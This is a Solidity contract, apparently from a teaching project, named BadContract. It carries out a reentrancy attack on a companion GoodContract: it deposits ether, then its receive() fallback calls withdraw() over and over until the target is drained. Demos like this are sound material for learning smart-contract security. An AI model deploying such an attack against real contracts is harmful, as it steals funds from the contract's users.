// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./GoodContract.sol";
import "hardhat/console.sol";

contract BadContract {
    GoodContract public goodContract;

    constructor(address _goodContract) {
        goodContract = GoodContract(_goodContract);
    }

    // Function to recieve the ether
    receive() external payable {
        console.log("Whitdraw called in Good Contract");
        if (address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    // start the attack
    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}
